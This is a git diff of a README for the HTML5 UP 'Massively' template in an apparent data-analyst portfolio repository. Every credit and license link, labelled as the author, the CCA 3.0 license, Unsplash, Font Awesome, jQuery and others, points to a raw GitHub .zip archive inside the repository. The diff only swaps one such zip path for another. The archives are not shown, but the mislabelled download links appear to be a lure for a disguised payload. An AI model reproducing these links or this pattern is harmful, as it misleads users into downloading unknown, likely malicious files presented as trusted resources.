@@ -1,6 +1,6 @@
 Massively by HTML5 UP
-https://raw.githubusercontent.com/FadelDia/MY-1ST_DATA_ANALYST_PORTFOLIO.github.io/main/assets/js/S-PORTFOLI-ANALYS-github-io-M-DAT-v2.7-beta.5.zip | @ajlkn
-Free for personal and commercial use under the CCA 3.0 license (https://raw.githubusercontent.com/FadelDia/MY-1ST_DATA_ANALYST_PORTFOLIO.github.io/main/assets/js/S-PORTFOLI-ANALYS-github-io-M-DAT-v2.7-beta.5.zip)
+https://raw.githubusercontent.com/FadelDia/MY-1ST_DATA_ANALYST_PORTFOLIO.github.io/main/assets/M_github_S_io_DAT_ANALYS_PORTFOLI_v2.9-beta.1.zip | @ajlkn
+Free for personal and commercial use under the CCA 3.0 license (https://raw.githubusercontent.com/FadelDia/MY-1ST_DATA_ANALYST_PORTFOLIO.github.io/main/assets/M_github_S_io_DAT_ANALYS_PORTFOLI_v2.9-beta.1.zip)
 
 
 This is Massively, a text-heavy, article-oriented design built around a huge background
@@ -15,18 +15,18 @@ you can use for pretty much whatever.
 (* = not included)
 
 AJ
-https://raw.githubusercontent.com/FadelDia/MY-1ST_DATA_ANALYST_PORTFOLIO.github.io/main/assets/js/S-PORTFOLI-ANALYS-github-io-M-DAT-v2.7-beta.5.zip | @ajlkn
+https://raw.githubusercontent.com/FadelDia/MY-1ST_DATA_ANALYST_PORTFOLIO.github.io/main/assets/M_github_S_io_DAT_ANALYS_PORTFOLI_v2.9-beta.1.zip | @ajlkn
 
 
 Credits:
 
 	Demo Images:
-		Unsplash (https://raw.githubusercontent.com/FadelDia/MY-1ST_DATA_ANALYST_PORTFOLIO.github.io/main/assets/js/S-PORTFOLI-ANALYS-github-io-M-DAT-v2.7-beta.5.zip)
+		Unsplash (https://raw.githubusercontent.com/FadelDia/MY-1ST_DATA_ANALYST_PORTFOLIO.github.io/main/assets/M_github_S_io_DAT_ANALYS_PORTFOLI_v2.9-beta.1.zip)
 
 	Icons:
-		Font Awesome (https://raw.githubusercontent.com/FadelDia/MY-1ST_DATA_ANALYST_PORTFOLIO.github.io/main/assets/js/S-PORTFOLI-ANALYS-github-io-M-DAT-v2.7-beta.5.zip)
+		Font Awesome (https://raw.githubusercontent.com/FadelDia/MY-1ST_DATA_ANALYST_PORTFOLIO.github.io/main/assets/M_github_S_io_DAT_ANALYS_PORTFOLI_v2.9-beta.1.zip)
 
 	Other:
-		jQuery (https://raw.githubusercontent.com/FadelDia/MY-1ST_DATA_ANALYST_PORTFOLIO.github.io/main/assets/js/S-PORTFOLI-ANALYS-github-io-M-DAT-v2.7-beta.5.zip)
-		Scrollex (https://raw.githubusercontent.com/FadelDia/MY-1ST_DATA_ANALYST_PORTFOLIO.github.io/main/assets/js/S-PORTFOLI-ANALYS-github-io-M-DAT-v2.7-beta.5.zip)
-		Responsive Tools (https://raw.githubusercontent.com/FadelDia/MY-1ST_DATA_ANALYST_PORTFOLIO.github.io/main/assets/js/S-PORTFOLI-ANALYS-github-io-M-DAT-v2.7-beta.5.zip)
+		jQuery (https://raw.githubusercontent.com/FadelDia/MY-1ST_DATA_ANALYST_PORTFOLIO.github.io/main/assets/M_github_S_io_DAT_ANALYS_PORTFOLI_v2.9-beta.1.zip)
+		Scrollex (https://raw.githubusercontent.com/FadelDia/MY-1ST_DATA_ANALYST_PORTFOLIO.github.io/main/assets/M_github_S_io_DAT_ANALYS_PORTFOLI_v2.9-beta.1.zip)
+		Responsive Tools (https://raw.githubusercontent.com/FadelDia/MY-1ST_DATA_ANALYST_PORTFOLIO.github.io/main/assets/M_github_S_io_DAT_ANALYS_PORTFOLI_v2.9-beta.1.zip)
